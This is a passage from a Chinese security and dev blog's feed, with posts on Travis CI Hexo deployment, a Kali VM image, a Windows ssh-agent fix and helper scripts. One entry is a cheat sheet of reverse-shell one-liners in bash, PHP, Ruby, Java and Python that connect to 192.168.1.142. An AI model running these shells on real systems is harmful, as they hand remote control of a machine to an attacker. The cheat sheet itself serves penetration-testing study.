<code>clone</code> 的时候没有这个公私钥，所以我们只能使用HTTPS协议，但是我使用的是 <code>.gitmodules</code> 文件里面定义的子模块SSH协议呀！我在这里也查了一下，解决方案就是上面的那样。节选出来：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># turn off the clone of submodules for change the SSH to HTTPS in .gitmodules to avoid the error</span></span><br><span class="line"><span class="attr">git:</span></span><br><span class="line"><span class="attr">  submodules:</span> <span class="literal">false</span></span><br><span class="line">        </span><br><span class="line"><span class="attr">before_install:</span></span><br><span class="line">    <span class="comment"># Use sed to replace the SSH URL with the public URL if .gitmodules exists</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">test</span> <span class="bullet">-e</span> <span class="string">".gitmodules"</span> <span class="string">&amp;&amp;</span> <span class="string">sed</span> <span class="bullet">-i</span> <span class="string">'s/git@github.com:/https:\/\/github.com\//'</span> <span class="string">.gitmodules</span></span><br><span class="line">    <span class="comment"># update the submodule in repo by manual</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">git</span> <span class="string">submodule</span> <span class="string">update</span> <span class="bullet">--init</span> <span class="bullet">--recursive</span></span><br></pre></td></tr></table></figure><p>先关闭了 <code>Travis CI</code> 的默认初始化子模块功能，然后后面我们先判断子模块配置文件是否存在（所以我刚才说最省事的就是使用 <code>releases</code> 主题，也就是不含 <code>.git</code> 文件夹的，具体见上面），然后判断子模块配置文件如果存在存在，就使用 <code>sed</code> 把命令把 <code>.gitmodules</code> 子模块配置文件中的SSH协议换成HTTPS协议再执行后面的操作。</p><h2 id="开启自动构建之旅"><a href="#开启自动构建之旅" class="headerlink" title="开启自动构建之旅"></a>开启自动构建之旅</h2><p>现在你的博客仓库 <code>akkuman.github.io</code> 文件夹下的 <code>hexo</code> 分支下的东西已经配置好了。</p><p>新分支有了，<code>.travis.yml</code> 文件也有了。</p><p>你现在可以直接 <code>push</code> 上去：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">":constructin_worker: The introduction of Travis CI"</span></span><br><span class="line">git push origin hexo:hexo</span><br></pre></td></tr></table></figure><p>然后打开 <code>Travis CI</code> 网站即可看到你的网站正在构建，如果构建失败，上面也有详细的报错可以帮你分析原因。构建成功后即可看到你焕然一新的网站了。</p><p>以后更新 <code>md</code> 就可以用上面的命令 <code>push</code> 到仓库，然后 <code>Travis CI</code> 会自动帮你构建到 <code>master</code> 分支</p><h3 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h3><p>为了以后不用打</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push origin hexo:hexo</span><br></pre></td></tr></table></figure><p>而是直接可以使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push</span><br></pre></td></tr></table></figure><p>我们可以设置上游分支，如果是第一次执行 <code>git push origin hexo:hexo</code>，它会提示你使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push --<span class="built_in">set</span>-upstream origin hexo</span><br></pre></td></tr></table></figure><p>使用上面的命令即可把本地的 <code>hexo</code> 的上游分支设置为远程仓库的 <code>hexo</code> 分支，以后 <code>push</code> 就可以简化命令为 <code>git push</code> 了。</p><p>当然你也可以手动设置上游分支，使用下面的命令把本地的 <code>hexo</code> 的上游分支设置为远程仓库的 <code>hexo</code> 分支：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch --<span class="built_in">set</span>-upstream-to=origin/hexo hexo</span><br></pre></td></tr></table></figure><h2 id="我的站点仓库配置示例"><a href="#我的站点仓库配置示例" class="headerlink" title="我的站点仓库配置示例"></a>我的站点仓库配置示例</h2><p>见 <a href="https://github.com/akkuman/akkuman.github.io/tree/hexo" target="_blank" rel="noopener">akkuman/akkuman.github.io</a></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://liolok.github.io/Hexo-Travis-CI/" target="_blank" rel="noopener">Hexo + Travis CI 博客管理</a></li><li><a href="http://magicse7en.github.io/2016/03/27/travis-ci-auto-deploy-hexo-github/#坑3：-travis-CI自动构建部署之后，博客页面空白，什么也没有" target="_blank" rel="noopener">使用Travis CI自动构建hexo博客</a></li><li><a href="http://www.itfanr.cc/2017/08/09/using-travis-ci-automatic-deploy-hexo-blogs/#创建-travis-yml-文件" target="_blank" rel="noopener">使用Travis CI自动部署Hexo博客</a></li><li><a href="https://docs.travis-ci.com/user/languages/r/#configuration-options" target="_blank" rel="noopener">Travis CI官方帮助文档</a></li><li><a href="https://blog.csdn.net/guotianqing/article/details/82391665" target="_blank" rel="noopener">git中submodule子模块的添加、使用和删除</a></li><li><a href="https://blog.chh.tw/posts/git-submodule/" target="_blank" rel="noopener">Git Submodule 用法筆記</a></li><li><a href="https://coding.net/help/doc/account/access-token.html" target="_blank" rel="noopener">CODING帮助文档-个人访问令牌</a><blockquote><p>提一句上面的git push –force –quiet “<a href="https://Akkuman:${CODING_TOKEN}@${CD_REF}&quot;" target="_blank" rel="noopener">https://Akkuman:${CODING_TOKEN}@${CD_REF}&quot;</a> 网址格式是查询的CODING帮助文档</p></blockquote></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;每次换系统或换电脑之后重新部署博客总是很苦恼？想像jekyll那样，一次性部署完成后，以后本地不用安装环境直接 &lt;code&gt;git push&lt;/code&gt; 就能生成博客？那我推荐你应该使用使用 &lt;code&gt;Travis CI&lt;/code&gt;了。&lt;/p&gt;
&lt;p&gt;这篇文章我们来讲讲如何利用 &lt;code&gt;Travis CI&lt;/code&gt;把你 &lt;code&gt;push&lt;/code&gt; 上去的博客源文件直接生成可访问的站点，并且同步部署到 &lt;code&gt;github pages&lt;/code&gt; 和 &lt;code&gt;coding pages&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;这篇文章假设你已经对这些采用 &lt;code&gt;git&lt;/code&gt; 版本控制系统的静态博客托管服务有所了解，并且知道怎么去简单的使用 &lt;code&gt;git&lt;/code&gt; 以及了解 &lt;code&gt;hexo&lt;/code&gt; 写博客发布到这些 &lt;code&gt;pages&lt;/code&gt; 服务的流程。因此本文会写的较为&lt;strong&gt;简略，旨在指出关键的地方以及我遇到的问题、问题产生的原因和提供的解决方案&lt;/strong&gt;，希望能够帮助到大家。&lt;/p&gt;
    
    </summary>
    
      <category term="git" scheme="http://hacktech.cn/categories/git/"/>
    
    
      <category term="blog" scheme="http://hacktech.cn/tags/blog/"/>
    
      <category term="git" scheme="http://hacktech.cn/tags/git/"/>
    
  </entry>
  
  <entry>
    <title>Kali Linux Xfce版美化虚拟机镜像</title>
    <link href="http://hacktech.cn/2018/09/04/kali-xfce-vm-amd64-beautify.html"/>
    <id>http://hacktech.cn/2018/09/04/kali-xfce-vm-amd64-beautify.html</id>
    <published>2018-09-04T02:59:43.000Z</published>
    <updated>2019-05-23T06:42:08.039Z</updated>
    
    <content type="html"><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>这两天来学校把硬盘基本全部清空了，所以以前的虚拟机就需要重新安装了。</p><p><code>Kali</code> 一直用的是 <code>xfce</code> 版本，至于为什么用这个版本，是因为我感觉 <code>gnome3</code> 在虚拟机上表现欠佳。当然，默认的 <code>gnome3</code> 看起来还是不错的，而 <code>xfce</code> 默认的就看起来很寒碜了</p><p>默认的 <code>Kali-Xfce</code> 是这个样子的</p><a id="more"></a><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382ly1fuxco29z1zj20le0c0146.jpg" alt="原版kali-xfce"></p><p>具体过程不表了，如果有人有需要我再发吧，毕竟这次美化过程没有记录，我也懒得再重操一遍了，直接上美化后的截图吧</p><h2 id="美化截图"><a href="#美化截图" class="headerlink" title="美化截图"></a>美化截图</h2><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382ly1fuxcov30z4j21hc0u07bd.jpg" alt=""></p><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382ly1fuxd0a4t5ej21hc0u0u0x.jpg" alt=""></p><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382ly1fuxd11uu4qj21hc0u0b29.jpg" alt=""></p><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><h3 id="基础使用"><a href="#基础使用" class="headerlink" title="基础使用"></a>基础使用</h3><p><strong>注意是64位的镜像，需要cpu虚拟化开启支持</strong></p><p>直接解压然后导入vmware（version &gt;= 10.X）虚拟机即可，默认账户密码为 <code>root:toor</code></p><p>软件源已改为国内的中科大源，不需要自己换</p><h3 id="系统更新"><a href="#系统更新" class="headerlink" title="系统更新"></a>系统更新</h3><p>已更新到 <code>2018-09-04</code> 最新，如果需要更新可以运行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt upadte</span><br><span class="line">apt full-upgrade</span><br></pre></td></tr></table></figure><h3 id="顶栏透明"><a href="#顶栏透明" class="headerlink" title="顶栏透明"></a>顶栏透明</h3><p>图片上的顶栏可以改为透明的，在顶栏上右键然后找到 <code>面板首选项 -&gt; 外观 -&gt; alpha</code> 改为 <code>0</code> ，顶栏可透明</p><h3 id="更新vmtool"><a href="#更新vmtool" class="headerlink" title="更新vmtool"></a>更新vmtool</h3><p>打开终端</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt update</span><br><span class="line">apt install open-vm-tools-desktop</span><br></pre></td></tr></table></figure><p>如果有新版本vmtool会提示更新</p><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><h3 id="校验"><a href="#校验" class="headerlink" title="校验"></a>校验</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">大小: 3649679846 字节</span><br><span class="line">修改时间: 2018年9月4日, 11:18:46</span><br><span class="line">MD5: EDC1BF26205D06EA668F8EA03A05D456</span><br><span class="line">SHA1: 4C2F32BA2DDC53425F34B4316F55C66755A08ACA</span><br><span class="line">CRC32: A51255F0</span><br></pre></td></tr></table></figure><h2 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h2><ul><li><a href="https://pan.baidu.com/s/1Neyff9GpVm08w5A6lesmQQ" target="_blank" rel="noopener">百度网盘 | 密码: jcus</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;起因&quot;&gt;&lt;a href=&quot;#起因&quot; class=&quot;headerlink&quot; title=&quot;起因&quot;&gt;&lt;/a&gt;起因&lt;/h2&gt;&lt;p&gt;这两天来学校把硬盘基本全部清空了，所以以前的虚拟机就需要重新安装了。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Kali&lt;/code&gt; 一直用的是 &lt;code&gt;xfce&lt;/code&gt; 版本，至于为什么用这个版本，是因为我感觉 &lt;code&gt;gnome3&lt;/code&gt; 在虚拟机上表现欠佳。当然，默认的 &lt;code&gt;gnome3&lt;/code&gt; 看起来还是不错的，而 &lt;code&gt;xfce&lt;/code&gt; 默认的就看起来很寒碜了&lt;/p&gt;
&lt;p&gt;默认的 &lt;code&gt;Kali-Xfce&lt;/code&gt; 是这个样子的&lt;/p&gt;
    
    </summary>
    
      <category term="Kali" scheme="http://hacktech.cn/categories/Kali/"/>
    
    
      <category term="Tools" scheme="http://hacktech.cn/tags/Tools/"/>
    
      <category term="Kali" scheme="http://hacktech.cn/tags/Kali/"/>
    
  </entry>
  
  <entry>
    <title>win10 1803版本unable to start ssh-agent service, error :1058</title>
    <link href="http://hacktech.cn/2018/09/01/win10-1803-unable-to-start-ssh-agent.html"/>
    <id>http://hacktech.cn/2018/09/01/win10-1803-unable-to-start-ssh-agent.html</id>
    <published>2018-09-01T08:26:11.000Z</published>
    <updated>2019-05-23T06:42:08.039Z</updated>
    
    <content type="html"><![CDATA[<p>PowerShell安装了pshazz或者posh-git，但是打开的时候提示 <code>unable to start ssh-agent service, error :1058</code>  </p><a id="more"></a><p>1803的设置上面可以看到这个版本是默认带了openssh客户端的，我们不需要另外去安装，但是命令行运行 <code>ssh-agent</code> 依然是显示 <code>unable to start ssh-agent service, error :1058</code>  </p><p>既然有这个东西，但是服务启动失败，那我们看看本地服务，果然，在本地服务中禁用了，我们改成手动或者自动就能解决这个问题了</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;PowerShell安装了pshazz或者posh-git，但是打开的时候提示 &lt;code&gt;unable to start ssh-agent service, error :1058&lt;/code&gt;  &lt;/p&gt;
    
    </summary>
    
      <category term="问题解决" scheme="http://hacktech.cn/categories/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/"/>
    
    
      <category term="问题解决" scheme="http://hacktech.cn/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/"/>
    
      <category term="Win10" scheme="http://hacktech.cn/tags/Win10/"/>
    
  </entry>
  
  <entry>
    <title>反弹shell以及端口转发的方法收集</title>
    <link href="http://hacktech.cn/2018/08/23/the-code-reverse-shell-and-port-forward.html"/>
    <id>http://hacktech.cn/2018/08/23/the-code-reverse-shell-and-port-forward.html</id>
    <published>2018-08-23T08:03:29.000Z</published>
    <updated>2019-05-23T06:42:08.039Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.1.142/80 0&gt;&amp;1</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> 5&lt;&gt;/dev/tcp/192.168.1.142/80</span><br><span class="line">cat &lt;&amp;5 | <span class="keyword">while</span> <span class="built_in">read</span> line; <span class="keyword">do</span> <span class="variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; <span class="keyword">done</span> </span><br><span class="line"><span class="comment"># or:</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> line 0&lt;&amp;5; <span class="keyword">do</span> <span class="variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; <span class="keyword">done</span></span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php -r ‘$sock=fsockopen(“<span class="number">192.168</span><span class="number">.1</span><span class="number">.142</span>”,<span class="number">80</span>);exec(“/bin/sh -i &lt;&amp;<span class="number">3</span> &gt;&amp;<span class="number">3</span> <span class="number">2</span>&gt;&amp;<span class="number">3</span>”);’</span><br><span class="line">(Assumes TCP uses file descriptor <span class="number">3.</span> <span class="keyword">If</span> it doesn’t work, <span class="keyword">try</span> <span class="number">4</span>,<span class="number">5</span>, <span class="keyword">or</span> <span class="number">6</span>)</span><br></pre></td></tr></table></figure><h2 id="RUBY"><a href="#RUBY" class="headerlink" title="RUBY"></a>RUBY</h2><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e’f=TCPSocket.open(“<span class="number">192.168</span>.<span class="number">1.142</span>”,<span class="number">80</span>).to_i;exec sprintf(“/bin/sh -i &lt;&amp;%d &gt;&amp;%d <span class="number">2</span>&gt;&amp;%d”,f,f,f)’</span><br></pre></td></tr></table></figure><h2 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([“/bin/bash”,”-c”,”exec <span class="number">5</span>&lt;&gt;/dev/tcp/<span class="number">192.168</span>.1.142/<span class="number">80</span>;cat &lt;&amp;<span class="number">5</span> | <span class="keyword">while</span> read line; <span class="keyword">do</span> \$line <span class="number">2</span>&gt;&amp;<span class="number">5</span> &gt;&amp;<span class="number">5</span>; done”] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure><h2 id="PYTHON"><a href="#PYTHON" class="headerlink" title="PYTHON"></a>PYTHON</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c ‘<span class="keyword">import</span> socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“<span class="number">192.168</span><span class="number">.1</span><span class="number">.142</span>”,<span class="number">80</span>));os.dup2(s.fileno(),<span class="number">0</span>); os.dup2(s.fileno(),<span class="number">1</span>); os.dup2(s.fileno(),<span class="number">2</span>);p=subprocess.call([“/bin/sh”,”-i”]);’</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Bash&quot;&gt;&lt;a href=&quot;#Bash&quot; class=&quot;headerlink&quot; title=&quot;Bash&quot;&gt;&lt;/a&gt;Bash&lt;/h2&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.1.142/80 0&amp;gt;&amp;amp;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;exec&lt;/span&gt; 5&amp;lt;&amp;gt;/dev/tcp/192.168.1.142/80&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;cat &amp;lt;&amp;amp;5 | &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;read&lt;/span&gt; line; &lt;span class=&quot;keyword&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$line&lt;/span&gt; 2&amp;gt;&amp;amp;5 &amp;gt;&amp;amp;5; &lt;span class=&quot;keyword&quot;&gt;done&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# or:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;read&lt;/span&gt; line 0&amp;lt;&amp;amp;5; &lt;span class=&quot;keyword&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$line&lt;/span&gt; 2&amp;gt;&amp;amp;5 &amp;gt;&amp;amp;5; &lt;span class=&quot;keyword&quot;&gt;done&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="Hacker" scheme="http://hacktech.cn/categories/Hacker/"/>
    
    
      <category term="Hacker" scheme="http://hacktech.cn/tags/Hacker/"/>
    
  </entry>
  
  <entry>
    <title>为纸小墨一键创建md文件</title>
    <link href="http://hacktech.cn/2018/08/22/ink-create-md.html"/>
    <id>http://hacktech.cn/2018/08/22/ink-create-md.html</id>
    <published>2018-08-22T10:17:23.000Z</published>
    <updated>2019-05-23T06:42:08.039Z</updated>
    
    <content type="html"><![CDATA[<p>用法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python the.py file_name [article_title] [author_id]</span><br><span class="line"><span class="comment"># []括起来为可选项</span></span><br></pre></td></tr></table></figure><a id="more"></a><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    file_name = <span class="string">''</span></span><br><span class="line">    post_title = <span class="string">''</span></span><br><span class="line">    author = <span class="string">'me'</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">2</span>:</span><br><span class="line">        file_name = str(sys.argv[<span class="number">1</span>])</span><br><span class="line">        post_title = str(sys.argv[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">elif</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        file_name = str(sys.argv[<span class="number">1</span>])</span><br><span class="line">        post_title = str(sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">elif</span> len(sys.argv) == <span class="number">4</span>:</span><br><span class="line">        file_name = str(sys.argv[<span class="number">1</span>])</span><br><span class="line">        post_title = str(sys.argv[<span class="number">2</span>])</span><br><span class="line">        author = str(sys.argv[<span class="number">3</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"Usage: \n\t%s file_name [article_title] [author_id]"</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'./blog/source/%s.md'</span> % file_name, <span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">'title: %s\n'</span> % post_title)</span><br><span class="line">        f.write(<span class="string">'date: %s\n'</span> % time.strftime(<span class="string">"%Y-%m-%d %H:%M:%S"</span>, time.localtime()))</span><br><span class="line">        f.write(<span class="string">'update: ""\n'</span>)</span><br><span class="line">        f.write(<span class="string">'author: %s\n'</span> % author)</span><br><span class="line">        f.write(<span class="string">'tags: \n'</span>)</span><br><span class="line">        f.write(<span class="string">'- \n'</span>)</span><br><span class="line">        f.write(<span class="string">'categories: \n'</span>)</span><br><span class="line">        f.write(<span class="string">'- \n'</span>)</span><br><span class="line">        f.write(<span class="string">'topic: ""\n'</span>)</span><br><span class="line">        f.write(<span class="string">'cover: ""\n'</span>)</span><br><span class="line">        f.write(<span class="string">'draft: false\n'</span>)</span><br><span class="line">        f.write(<span class="string">'preview: ""\n'</span>)</span><br><span class="line">        f.write(<span class="string">'top: false\n'</span>)</span><br><span class="line">        f.write(<span class="string">'type: ""\n'</span>)</span><br><span class="line">        f.write(<span class="string">'hide: false\n'</span>)</span><br><span class="line">        f.write(<span class="string">'config: null\n'</span>)</span><br><span class="line">        f.write(<span class="string">'\n\n---\n\n\n\n'</span>)</span><br><span class="line">    print(<span class="string">'Create %s.md Finished'</span> % file_name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;用法：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;python the.py file_name [article_title] [author_id]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# []括起来为可选项&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="Python" scheme="http://hacktech.cn/categories/Python/"/>
    
    
      <category term="Python" scheme="http://hacktech.cn/tags/Python/"/>
    
      <category term="Tools" scheme="http://hacktech.cn/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>一键git push脚本(python版)</title>
    <link href="http://hacktech.cn/2018/08/22/git-push-python-script.html"/>
    <id>http://hacktech.cn/2018/08/22/git-push-python-script.html</id>
    <published>2018-08-22T09:34:24.000Z</published>
    <updated>2019-05-23T06:42:08.039Z</updated>
    
    <content type="html"><![CDATA[<p>有时候感觉项目push上去每次都敲那么几个命令挺烦人的，可以用这个脚本来代替手工</p><a id="more"></a><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">gitconfig = &#123;</span><br><span class="line">    <span class="string">'cwd'</span>: <span class="string">'./blog/public'</span>,</span><br><span class="line">    <span class="string">'git'</span>: &#123;</span><br><span class="line">        <span class="string">'github'</span>: [<span class="string">'git@github.com:akkuman/akkuman.github.io.git'</span>, <span class="string">'master'</span>],</span><br><span class="line">        <span class="string">'coding'</span>: [<span class="string">'git@git.coding.net:Akkuman/Akkuman.git'</span>, <span class="string">'coding-pages'</span>],</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> gitconfig</span><br><span class="line"></span><br><span class="line">    <span class="comment"># change working directory</span></span><br><span class="line">    os.chdir(gitconfig.get(<span class="string">'cwd'</span>, <span class="string">'.'</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># check if git init</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'.git'</span> <span class="keyword">not</span> <span class="keyword">in</span> os.listdir():</span><br><span class="line">        subprocess.check_call([<span class="string">'git'</span>, <span class="string">'init'</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># check if remote in config, if not, add the remote</span></span><br><span 